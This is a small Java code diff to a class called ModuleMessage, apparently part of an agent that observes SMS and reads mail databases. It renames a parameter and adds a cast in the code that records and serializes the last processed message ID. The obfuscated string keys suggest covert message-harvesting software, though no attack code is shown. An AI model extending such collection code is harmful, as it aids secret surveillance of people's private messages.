@@ -365,16 +365,16 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 	}
 
-	public void updateMarkupMail(String mailstore, int lastId, boolean serialize) {
+	public void updateMarkupMail(String mailstore, int newLastId, boolean serialize) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (updateMarkupMail), mailStore: " + mailstore + " +lastId: " + lastId);
+			Check.log(TAG + " (updateMarkupMail), mailStore: " + mailstore + " +lastId: " + newLastId);
 		}
 
-		lastMail.put(mailstore, lastId);
+		lastMail.put(mailstore, newLastId);
 		try {
-			if (serialize || (lastId % 10 == 0)) {
+			if (serialize || (newLastId % 10 == 0)) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateMarkupMail), write lastId: " + lastId);
+					Check.log(TAG + " (updateMarkupMail), write lastId: " + newLastId);
 				}
 				storedMAIL.writeMarkupSerializable(lastMail);
 			}
@@ -444,7 +444,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 					// i_2=messages
 					// Messages.getString("i_2")
-					int newLastId = helper.traverseRecords("messages", visitor);
+					int newLastId = (int) helper.traverseRecords("messages", visitor);
 
 					if (newLastId > lastId) {
 						updateMarkupMail(mailstore, newLastId, true);
